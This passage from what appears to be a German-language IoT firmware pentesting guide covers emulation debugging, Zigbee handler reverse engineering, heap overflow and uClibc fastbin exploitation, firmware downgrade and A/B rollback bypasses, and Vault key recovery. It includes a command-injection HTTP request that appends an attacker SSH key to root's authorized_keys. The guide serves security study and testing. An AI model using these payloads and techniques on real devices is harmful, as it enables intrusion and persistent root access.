  -device sdhci-pci -device sd-card,drive=emmc \
  -drive if=virtio,format=raw,readonly=on,file=rootfs-edited.squashfs
```

#### Offline-Debugging des Image-Zustands

Untersuche den persistenten Zustand außerhalb des Guests, wenn langsame Bootvorgänge, destruktive Startskripte oder unzuverlässige Konsolenprotokollierung die Fehlersuche erschweren. Hänge niemals ein Overlay ein, das eine laufende VM verwendet; stelle es mit `qemu-nbd` bereit, beschränke die LVM-Erkennung auf die vorgesehene NBD-Partition und deaktiviere die Volume Group, bevor du die Verbindung trennst.<sup>[[11]](#references)</sup>

```bash
sudo modprobe nbd max_part=16
sudo qemu-nbd --connect=/dev/nbd0 overlay.qcow2
sudo vgscan --config 'devices { filter = ["a|/dev/nbd0p4|", "r|.*|"] }'
# inspect/fsck/mount the discovered logical volumes
sudo vgchange -an VG_NAME
sudo qemu-nbd --disconnect /dev/nbd0
```

Für eine reproduzierbare Fehlerisolierung sollten zeitgestempelte Markierungsdateien auf einem dauerhaft verfügbaren, beschreibbaren Volume gespeichert und offline überprüft werden; `/dev/kmsg`, FIFOs und kurzlebige Konsolen können durch Ratenbegrenzungen oder den vorzeitigen Abbruch eines Prozesses zu falsch negativen Ergebnissen führen. Vergleiche außerdem die exakten Schnittstellen zwischen den Ebenen, bevor du nicht zusammenhängenden Code änderst: `uname -r` mit `/lib/modules/`, ext4-Features auf dem Datenträger mit der Kernel-Konfiguration und die Mesa-`libGL`-Generation mit der DRI-Treiberschnittstelle sowie den aus der PCI-ID abgeleiteten Treibernamen. Eine Komponente kann vorhanden sein und sogar erfolgreich per `dlopen()` geladen werden, aber trotzdem unbrauchbar bleiben, weil ihr Consumer eine andere ABI erwartet.<sup>[[11]](#references)</sup>

## Dynamische Analyse in der Praxis

In dieser Phase wird für die Analyse entweder eine echte oder eine emulierte Geräteumgebung verwendet. Es ist wichtig, den Shell-Zugriff auf das Betriebssystem und das Dateisystem aufrechtzuerhalten. Die Emulation bildet Hardwareinteraktionen möglicherweise nicht perfekt nach, sodass gelegentliche Neustarts der Emulation erforderlich sein können. Bei der Analyse sollten das Dateisystem erneut untersucht, offengelegte Webseiten und Netzwerkdienste ausgenutzt und Bootloader-Schwachstellen erkundet werden. Firmware-Integritätstests sind entscheidend, um mögliche Backdoor-Schwachstellen zu identifizieren.

## Techniken zur Laufzeitanalyse

Bei der Laufzeitanalyse wird mit einem Prozess oder einer Binärdatei in ihrer Betriebsumgebung interagiert. Dazu werden Tools wie gdb-multiarch, Frida und Ghidra verwendet, um Breakpoints zu setzen und durch Fuzzing sowie andere Techniken Schwachstellen zu identifizieren.

Bei Embedded-Zielen ohne vollständigen Debugger **kopiere ein statisch gelinktes `gdbserver`** auf das Gerät und verbinde dich remote:<sup>[[6]](#references)</sup>

```bash
# On device
gdbserver :1234 /usr/bin/targetd
```

```bash
# On host
gdb-multiarch /path/to/targetd
target remote <device-ip>:1234
```

### Zigbee-/Radio-Co-Processor-Nachrichten-Mapping

Bei IoT-Hubs ist der RF-Stack häufig zwischen einem **Radio-MCU** und einem Linux-Userland-Prozess aufgeteilt. Ein nützlicher Workflow ist, den Pfad zu erfassen:<sup>[[8]](#references)</sup>

1. **RF-Frame** über Funk
2. **Controller-seitiger Parser** auf dem Radio-MCU
3. **Serielles/UART-Text- oder TLV-Protokoll**, das an Linux weitergeleitet wird (zum Beispiel `/dev/tty*`)
4. **Application-Dispatcher** im Haupt-Daemon
5. **Protokollspezifischer Handler / Zustandsautomat**

Diese Architektur bietet zwei statt nur eines Ziels für das Reverse Engineering. Wenn der Controller binäre Funk-Frames in ein Textprotokoll wie `Group,Command,arg1,arg2,...` umwandelt, ermittle:

- Die **Nachrichtengruppen** und Dispatch-Tabellen
- Welche Nachrichten aus dem **Netzwerk** und welche vom Controller selbst stammen können
- Die genauen **herstellerspezifischen Unterscheidungsfelder** (zum Beispiel Zigbee `manufacturer_code` und benutzerdefiniertes `cluster_command`)
- Welche Handler nur während **Commissioning**, Discovery oder Firmware-/Modell-Download-Phasen erreichbar sind

Speziell bei Zigbee solltest du den Pairing-Verkehr mitschneiden und prüfen, ob das Ziel noch auf den Standard-**Link Key** `ZigBeeAlliance09` zurückgreift. Falls ja, kann das Mitschneiden des Commissioning-Verkehrs den **Network Key** offenlegen. Zigbee-3.0-Installationscodes verringern dieses Risiko. Halte daher fest, ob das getestete Gerät sie tatsächlich erzwingt.

### Herstellerspezifische Protokoll-Handler und durch FSM begrenzte Erreichbarkeit

Herstellerspezifische Zigbee-/ZCL-Befehle sind oft ein besseres Ziel als standardisierte Cluster, da sie **benutzerdefinierten Parsing-Code** und interne **FSMs** erreichen, deren Validierung weniger ausgereift ist.<sup>[[8]](#references)</sup>

Praktischer Workflow:

- Reverse Engineere den Command-Dispatcher, bis du den **nur für den Hersteller vorgesehenen Handler** findest.
- Ermittle die Tabellen für **FSM-Zustand**, **Ereignis**, **Prüfung**, **Aktion** und **Folgezustand**.
- Identifiziere **Übergangszustände**, die automatisch weiterlaufen, sowie Retry-/Fehlerzweige, die letztlich den angreiferkontrollierten Zustand zurücksetzen oder freigeben.
- Prüfe, welche legitimen Protokollaustausche erforderlich sind, um den Daemon in den verwundbaren Zustand zu versetzen, statt anzunehmen, dass der fehlerhafte Handler immer erreichbar ist.

Bei zeitkritischen Protokollen kann die Paketwiedergabe über ein Python-Framework zu langsam sein. Zuverlässiger ist es, ein legitimes Gerät auf echter Hardware (zum Beispiel einem **nRF52840**) mit einem herstellerspezifischen Stack zu emulieren, damit die passenden **Endpoints**, **Attributes** und das richtige Commissioning-Timing verwendet werden.

### Fehlerklasse: fragmentierte Downloads in Embedded-Daemons

Ein wiederkehrender Firmware-Fehlertyp findet sich bei **fragmentierten Downloads von Blobs, Modellen und Konfigurationen**:<sup>[[8]](#references)</sup>

1. Das **erste Fragment** (`offset == 0`) speichert `ctx->total_size` und reserviert Speicher mit `malloc(total_size)`.
2. Spätere Fragmente validieren nur die vom Angreifer kontrollierten **paketlokalen** Felder wie `packet_total_size >= offset + chunk_len`.
3. Beim Kopieren wird `memcpy(&ctx->buffer[offset], chunk, chunk_len)` verwendet, ohne die **ursprünglich reservierte Größe** zu prüfen.

Dadurch kann ein Angreifer Folgendes senden:

- Ein gültiges erstes Fragment mit einer **kleinen** angegebenen Gesamtgröße, um eine kleine Heap-Allokation zu erzwingen.
- Ein späteres Fragment mit dem **erwarteten Offset**, aber einem größeren `chunk_len`.
- Eine gefälschte paketlokale Größe, die die erneuten Prüfungen besteht, aber trotzdem den ursprünglich reservierten Buffer überlaufen lässt.

Wenn der verwundbare Pfad durch die Commissioning-Logik geschützt ist, muss der Exploit ausreichend **Geräteemulation** enthalten, um das Ziel in den erwarteten Modell-Download- oder Blob-Download-Zustand zu versetzen, bevor die fehlerhaften Fragmente gesendet werden.

### Protokollgesteuerte `free()`-Auslöser

Bei Embedded-Daemons ist es oft einfacher, Heap-Metadaten-Exploitation auszulösen, indem man nicht „auf Cleanup wartet“, sondern **die eigene Fehlerbehandlung des Protokolls erzwingt**:<sup>[[8]](#references)</sup>

- Sende fehlerhafte Folgefragmente, um die FSM in **Retry-** oder **Fehlerzustände** zu versetzen.
- Überschreite den Retry-Grenzwert, sodass der Daemon den **Kontext zurücksetzt** und den beschädigten Buffer freigibt.
- Nutze dieses vorhersehbare `free()`, um allocator-seitige Primitives auszulösen, bevor der Prozess aus anderen Gründen abstürzt.

Das ist besonders nützlich bei **musl/uClibc/dlmalloc-ähnlichen** Allokatoren in Embedded Linux, bei denen beschädigte Chunk-Metadaten die Unlink-/Unbin-Logik in ein Write-Primitive verwandeln können. Ein stabiles Muster ist, ein **Size-Feld** zu beschädigen, um die Allokator-Traversierung auf **Fake Chunks im übergelaufenen Buffer** umzulenken, statt sofort echte Bin-Pointer zu überschreiben und den Prozess zum Absturz zu bringen.

## Binary Exploitation und Proof-of-Concept

Die Entwicklung eines PoC für erkannte Schwachstellen erfordert ein tiefes Verständnis der Zielarchitektur und Programmierkenntnisse in Low-Level-Sprachen. Binäre Laufzeitschutzmechanismen sind in Embedded-Systemen selten. Sind sie jedoch vorhanden, können Techniken wie Return Oriented Programming (ROP) erforderlich sein.

### Hinweise zur uClibc-Fastbin-Exploitation (Embedded Linux)

- **Fastbins + Konsolidierung:** uClibc verwendet Fastbins, ähnlich wie glibc. Eine spätere große Allokation kann `__malloc_consolidate()` auslösen. Daher muss jeder Fake Chunk die Prüfungen bestehen (plausible Größe, `fd = 0` und umliegende Chunks, die als „in use“ erkannt werden).<sup>[[6]](#references)</sup>
- **Nicht-PIE-Binaries unter ASLR:** Wenn ASLR aktiviert, das Haupt-Binary aber **non-PIE** ist, bleiben die Adressen innerhalb des Binaries in `.data/.bss` stabil. Du kannst einen Bereich anvisieren, der bereits wie ein gültiger Heap-Chunk-Header aussieht, um eine Fastbin-Allokation auf eine **Function-Pointer-Tabelle** zu lenken.
- **NUL-Byte zum Stoppen des Parsers:** Beim Parsen von JSON kann ein `\x00` im Payload das Parsing stoppen und zugleich nachfolgende, vom Angreifer kontrollierte Bytes für einen Stack Pivot oder eine ROP-Chain erhalten.
- **Shellcode über `/proc/self/mem`:** Eine ROP-Chain, die `open("/proc/self/mem")`, `lseek()` und `write()` aufruft, kann ausführbaren Shellcode in einem bekannten Mapping platzieren und dorthin springen.

## Vorbereitete Betriebssysteme für Firmware-Analyse

Betriebssysteme wie [AttifyOS](https://github.com/adi0x90/attifyos) und [EmbedOS](https://github.com/scriptingxss/EmbedOS) bieten vorkonfigurierte Umgebungen für Firmware-Sicherheitstests, die mit den erforderlichen Tools ausgestattet sind.

## Vorbereitete Betriebssysteme zur Firmware-Analyse

- [**AttifyOS**](https://github.com/adi0x90/attifyos): AttifyOS ist eine Distribution, die Sicherheitsbewertungen und Penetrationstests von Internet-of-Things-Geräten (IoT) unterstützt. Sie spart viel Zeit, da sie eine vorkonfigurierte Umgebung mit allen erforderlichen Tools bereitstellt.
- [**EmbedOS**](https://github.com/scriptingxss/EmbedOS): Betriebssystem für Embedded-Sicherheitstests auf Basis von Ubuntu 18.04, mit vorinstallierten Tools für Firmware-Sicherheitstests.

## Firmware-Downgrade-Angriffe und unsichere Update-Mechanismen

Selbst wenn ein Hersteller kryptografische Signaturprüfungen für Firmware-Images implementiert, fehlt häufig der **Schutz vor Versions-Rollback (Downgrade)**. Wenn der Boot- oder Recovery-Loader lediglich die Signatur mit einem eingebetteten öffentlichen Schlüssel prüft, aber nicht die *Version* (oder einen monotonen Zähler) des zu flashenden Images vergleicht, kann ein Angreifer rechtmäßig eine **ältere, verwundbare Firmware mit weiterhin gültiger Signatur** installieren und dadurch bereits behobene Schwachstellen erneut einführen.<sup>[[4]](#references)</sup>

Typischer Angriffsablauf:

1. **Ein älteres signiertes Image beschaffen**
   * Von einem öffentlichen Download-Portal, einem CDN oder der Support-Website des Herstellers herunterladen.
   * Aus zugehörigen Mobil- oder Desktop-Anwendungen extrahieren (z. B. aus `assets/firmware/` innerhalb eines Android-APK).
   * Aus Repositories Dritter wie VirusTotal, Internet-Archiven, Foren usw. beziehen.
2. **Das Image über einen zugänglichen Update-Kanal auf das Gerät hochladen oder bereitstellen:**
   * Web-UI, API einer mobilen App, USB, TFTP, MQTT usw.
   * Viele IoT-Geräte für Endverbraucher bieten *nicht authentifizierte* HTTP(S)-Endpunkte, die Base64-codierte Firmware-Blobs annehmen, serverseitig decodieren und eine Wiederherstellung oder ein Upgrade auslösen.
3. Nach dem Downgrade eine Schwachstelle ausnutzen, die in einer neueren Version behoben wurde (zum Beispiel einen später hinzugefügten Command-Injection-Filter).
4. Optional das neueste Image wieder flashen oder Updates deaktivieren, um nach Erlangen von Persistenz nicht entdeckt zu werden.

### Beispiel: Command Injection nach einem Downgrade

```http
POST /check_image_and_trigger_recovery?md5=1; echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC...' >> /root/.ssh/authorized_keys HTTP/1.1
Host: 192.168.0.1
Content-Type: application/octet-stream
Content-Length: 0
```

In der anfälligen (downgradeten) Firmware wird der Parameter `md5` ohne Bereinigung direkt an einen Shell-Befehl angehängt, wodurch beliebige Befehle eingeschleust werden können (hier: SSH-Schlüsselzugriff mit Root-Rechten aktivieren). Spätere Firmware-Versionen führten einen einfachen Zeichenfilter ein, doch da ein Downgrade-Schutz fehlt, ist die Fehlerbehebung wirkungslos.<sup>[[4]](#references)</sup>

### Firmware aus mobilen Apps extrahieren

Viele Hersteller bündeln vollständige Firmware-Images in ihren begleitenden mobilen Apps, damit die App das Gerät über Bluetooth/Wi-Fi aktualisieren kann. Diese Pakete sind in der APK/APEX häufig unverschlüsselt unter Pfaden wie `assets/fw/` oder `res/raw/` gespeichert. Mit Tools wie `apktool`, `ghidra` oder sogar einfachem `unzip` lassen sich signierte Images extrahieren, ohne die physische Hardware anzufassen.<sup>[[4]](#references)</sup>

```
$ apktool d vendor-app.apk -o vendor-app
$ ls vendor-app/assets/firmware
firmware_v1.3.11.490_signed.bin
```

### Updater-only-Umgehung des Anti-Rollback-Schutzes bei A/B-Slot-Designs

Einige Anbieter implementieren zwar einen Anti-Downgrade-**Ratchet**, jedoch nur innerhalb der *Updater*-Logik (z. B. eine UDS-Routine über CAN, einen Recovery-Befehl oder einen OTA-Agent im Userspace). Prüft der **Bootloader** später nur die Image-Signatur/CRC und vertraut der Partitionstabelle oder den Slot-Metadaten, lässt sich der Rollback-Schutz dennoch umgehen.<sup>[[7]](#references)</sup>

Typisches schwaches Design:

- Firmware-Metadaten enthalten sowohl einen Versionsdeskriptor als auch einen **Security-Ratchet** / monotonen Zähler.
- Der Updater vergleicht den Image-Ratchet mit einem in persistentem Speicher abgelegten Wert und lehnt ältere signierte Images ab.
- Der Bootloader **liest diesen Ratchet nicht aus** und prüft vor dem Booten des ausgewählten Slots nur Header, CRC und Signatur.
- Die Slot-Aktivierung wird separat in einer Partitionstabelle oder einem generationsbasierten Zähler pro Slot gespeichert und ist **nicht kryptografisch an den exakten Digest der validierten Firmware gebunden**.

Dadurch entsteht bei Systemen mit zwei Slots eine Primitive vom Typ **ein Image validieren / ein anderes booten**. Kann der Angreifer den Updater dazu bringen, Slot B mithilfe eines aktuellen signierten Images als nächstes Boot-Ziel zu markieren, und Slot B anschließend vor dem Neustart überschreiben, bootet der Bootloader möglicherweise dennoch das Downgrade-Image, da er nur den bereits festgeschriebenen Slot-Metadaten vertraut.

Typisches Missbrauchsmuster:

1. Eine **aktuelle signierte** Firmware in den passiven Slot hochladen und die normale Validierungs-/Wechselroutine ausführen, sodass das Layout diesen Slot als nächsten aktiven Slot markiert.
2. **Noch nicht neu starten**. In derselben Sitzung die Slot-Vorbereitungs-/Löschroutine erneut aufrufen.
3. Veralteten Boot-Status oder veraltete Slot-Auswahllogik ausnutzen, sodass der Updater **denselben physischen Slot** löscht, der gerade aktiviert wurde.
4. Eine **ältere, aber weiterhin signierte** Firmware in diesen Slot schreiben.
5. Die Validierungsroutine umgehen, die den Ratchet durchsetzt, und direkt neu starten.
6. Der Bootloader wählt den aktivierten Slot aus, prüft nur Signatur/Integrität und bootet das alte Image.

Worauf beim Reverse Engineering von A/B-Update-Implementierungen zu achten ist:

- Slot-Auswahl anhand von **Boot-Zeit-Flags**, die nach einem erfolgreichen Wechsel nicht aktualisiert werden.
- Eine Routine vom Typ `prepare_passive_slot()`, die einen Slot anhand eines veralteten Status statt des **aktuell festgeschriebenen Layouts** löscht.
- Eine Funktion vom Typ `part_write_layout()`, die nur einen **Generationszähler** / ein Aktiv-Flag erhöht und den Hash des validierten Images nicht speichert.
- Ratchet-Prüfungen, die im Userspace oder im Updater-Code implementiert sind, aber **nicht in ROM / Bootloader / Secure-Boot-Stufen**.
- Lösch- oder Recovery-Routinen, durch die ein Slot weiterhin als bootfähig markiert bleibt, obwohl sein Inhalt entfernt und neu geschrieben wurde.

### Checkliste zur Bewertung der Update-Logik

* Ist der Transport bzw. die Authentifizierung des *Update-Endpunkts* angemessen geschützt (TLS + Authentifizierung)?
* Vergleicht das Gerät **Versionsnummern** oder einen **monotonen Anti-Rollback-Zähler**, bevor es das Image flasht?
* Wird das Image innerhalb einer Secure-Boot-Kette verifiziert (z. B. durch Signaturprüfung im ROM-Code)?
* Setzt der **Bootloader denselben Ratchet wie der Updater durch**, statt nur Signatur/CRC zu prüfen?
* Sind die Slot-Aktivierungsmetadaten **an den validierten Firmware-Digest bzw. die Version gebunden**, oder kann ein Slot nach seiner Aktivierung verändert werden?
* Wird das Gerät nach einem erfolgreichen Slot-Wechsel zu einem Neustart gezwungen, oder sind spätere Update-/Löschroutinen in derselben Sitzung weiterhin erreichbar?
* Führt der Userspace-Code zusätzliche Plausibilitätsprüfungen durch (z. B. zulässige Partitionszuordnung, Modellnummer)?
* Verwenden *partielle* oder *Backup*-Update-Abläufe dieselbe Validierungslogik?

> 💡  Fehlt einer der oben genannten Punkte, ist die Plattform wahrscheinlich anfällig für Rollback-Angriffe.

## Verwundbare Firmware zum Üben

Um das Auffinden von Schwachstellen in Firmware zu üben, kannst du mit den folgenden verwundbaren Firmware-Projekten beginnen.

- OWASP IoTGoat
  - [https://github.com/OWASP/IoTGoat](https://github.com/OWASP/IoTGoat)
- The Damn Vulnerable Router Firmware Project
  - [https://github.com/praetorian-code/DVRF](https://github.com/praetorian-code/DVRF)
- Damn Vulnerable ARM Router (DVAR)
  - [https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html](https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html)
- ARM-X
  - [https://github.com/therealsaumil/armx#downloads](https://github.com/therealsaumil/armx#downloads)
- Azeria Labs VM 2.0
  - [https://azeria-labs.com/lab-vm-2-0/](https://azeria-labs.com/lab-vm-2-0/)
- Damn Vulnerable IoT Device (DVID)
  - [https://github.com/Vulcainreo/DVID](https://github.com/Vulcainreo/DVID)

## Wiederherstellung von Firmware-Entschlüsselungsschlüsseln aus eingebettetem KMS-/Vault-Status

Wenn ein Update-Image kleine Klartext-Metadaten mit einem großen Blob hoher Entropie kombiniert, solltest du zuerst den Container untersuchen, bevor du irgendetwas per Brute-Force angreifst:<sup>[[1]](#references)</sup>

- Header, Offsets und Zeilengrenzen mit `hexdump`, `xxd`, `strings -tx`, `base64 -d` und `binwalk -E` ausgeben.
- `Salted__` deutet in der Regel auf das OpenSSL-`enc`-Format hin: Die nächsten 8 Bytes sind der Salt, die übrigen Bytes der Ciphertext.
- Ein Base64-Feld, das zu genau `256` Bytes dekodiert wird, ist ein starkes Indiz dafür, dass es sich um einen RSA-2048-Ciphertext handelt, der ein zufälliges Firmware-Passwort bzw. einen Session-Key umschließt.
- Separates PGP-Material in derselben Datei schützt oft nur die Authentizität; gehe nicht davon aus, dass es zur Verschlüsselung dient.

Wenn die statische Suche nach Schlüsseln (`grep`, `strings`, PEM-/PGP-Suchen) erfolglos bleibt, analysiere stattdessen den **operativen Entschlüsselungspfad**, anstatt nur nach privaten Schlüsseln zu suchen:

- Decompiliere den Updater bzw. die Verwaltungs-Binärdatei und verfolge, wer den verschlüsselten Blob liest, welche Hilfsfunktion/API ihn entschlüsselt und welchen logischen Schlüsselnamen sie anfordert.
- Durchsuche das extrahierte Root-Dateisystem nach KMS-Status (`vault/`, `transit/`, `pkcs11`, `keystore`, `sealed-secrets`) sowie nach Unit-Dateien und Init-Skripten.
- Behandle Klartextbefehle wie `vault operator unseal ...`, Recovery-Keys, Bootstrap-Tokens oder lokale KMS-Auto-Unseal-Skripte so, als wären sie private Schlüssel.

Wenn das Gerät die ursprüngliche Vault-Binärdatei und das Storage-Backend mitliefert, ist es in der Regel einfacher, diese Umgebung nachzubilden, als die Vault-Interna neu zu implementieren:

```bash
vault server -config=/tmp/vault.hcl
vault operator unseal <share1>
vault operator unseal <share2>
vault operator unseal <share3>

OTP=$(vault operator generate-root -generate-otp)
INIT=$(vault operator generate-root -init -otp="$OTP" 2>&1 | sed 's/\x1b\[[0-9;]*m//g')
NONCE=$(printf '%s\n' "$INIT" | awk '/Nonce/ {print $2}')
vault operator generate-root -nonce="$NONCE" "<share1>"
vault operator generate-root -nonce="$NONCE" "<share2>"
FINAL=$(vault operator generate-root -nonce="$NONCE" "<share3>" 2>&1 | sed 's/\x1b\[[0-9;]*m//g')
TOKEN=$(vault operator generate-root -decode="$(printf '%s\n' "$FINAL" | awk '/Root Token/ {print $3}')" -otp="$OTP")
```

Mit root auf dem geklonten KMS:

- Transit-Schlüssel nur innerhalb des isolierten Klons exportierbar machen: `vault write transit/keys/<name>/config exportable=true`
- Den Unwrap-Schlüssel exportieren: `vault read transit/export/encryption-key/<name>`
- Den wiederhergestellten RSA-Schlüssel mit genau dem vom KMS verwendeten Padding-/Hash-Paar testen. Ein fehlgeschlagener PKCS#1-v1.5-Decrypt und ein fehlgeschlagener standardmäßiger OAEP-Decrypt beweisen **nicht**, dass der Schlüssel falsch ist. Viele von Vault unterstützte Abläufe verwenden OAEP mit SHA-256, während gängige Bibliotheken standardmäßig SHA-1 verwenden.
- Wenn der Payload mit `Salted__` beginnt, den OpenSSL-KDF des Herstellers exakt nachbilden (`EVP_BytesToKey`, bei älteren Appliances oft MD5), bevor du eine AES-CBC-Entschlüsselung versuchst.

So wird aus „verschlüsselter Firmware“ ein allgemeineres Problem: **die operativen Schlüssel auf der Appliance wiederherstellen und anschließend die exakten Unwrap- und KDF-Parameter offline nachbilden**.

## Schulungen und Zertifizierungen

- [https://www.attify-store.com/products/offensive-iot-exploitation](https://www.attify-store.com/products/offensive-iot-exploitation)

## References

- [1] [Firmware mit Claude knacken: Skill auf Senior-Level, Autonomie auf Junior-Level](https://bishopfox.com/blog/cracking-firmware-with-claude-senior-level-skill-junior-level-autonomy)
- [2] [Methodik für Firmware-Sicherheitstests](https://scriptingxss.gitbook.io/firmware-security-testing-methodology/)
- [3] [Praktisches IoT-Hacking: Der definitive Leitfaden zum Angriff auf das Internet der Dinge](https://www.amazon.co.uk/Practical-IoT-Hacking-F-Chantzis/dp/1718500904)
- [4] [Zero-Days in vernachlässigter Hardware ausnutzen – Trail-of-Bits-Blog](https://blog.trailofbits.com/2025/07/25/exploiting-zero-days-in-abandoned-hardware/)
- [5] [Wie mir ein 20-Dollar-Smart-Gerät Zugriff auf dein Zuhause verschaffte](https://bishopfox.com/blog/how-a-20-smart-device-gave-me-access-to-your-home)
- [6] [Jetzt siehst du mich: Jetzt bist du gehackt](https://labs.taszk.io/articles/post/nowyouseemi/)
- [7] [Synacktiv – Den Tesla Wall Connector über seinen Ladeanschluss ausnutzen – Teil 2: Die Anti-Downgrade-Maßnahme umgehen](https://www.synacktiv.com/en/publications/exploiting-the-tesla-wall-connector-from-its-charge-port-connector-part-2-bypassing)
- [8] [Bring es zum Blinken: Over-the-Air-Exploitation der Philips Hue Bridge](https://www.synacktiv.com/en/publications/make-it-blink-over-the-air-exploitation-of-the-philips-hue-bridge.html)
- [9] [Tesla OS auf QEMU rooten, Teil 1: Entpacken](https://cn0xroot.wordpress.com/2026/09/19/root-tesla-os-on-qemu-part-1-unpacking)
- [10] [Linux-Kernel-Dokumentation – dm-linear](https://docs.kernel.org/admin-guide/device-mapper/linear.html)
- [11] [Tesla OS auf QEMU rooten, Teil 2: Debugging und Fehlerbehebung](https://cn0xroot.wordpress.com/2026/09/20/root_tesla_os_on_qemu_part_2_debugging_fixing)
- [12] [Dell-BIOS-Passwörter: Schwache XOR-Verschlüsselung ermöglicht die Wiederherstellung aus SPI-Flash (CVE-2026-40639)](https://mdsec.co.uk/2026/07/dell-bios-passwords-weak-xor-encryption-allows-recovery-from-spi-flash-cve-2026-40639)
- [13] [R3n5k1/dellpwn – Tool zur Wiederherstellung von Dell-BIOS-Passwörtern](https://github.com/R3n5k1/dellpwn)
{{#include ../../banners/hacktricks-training.md}}
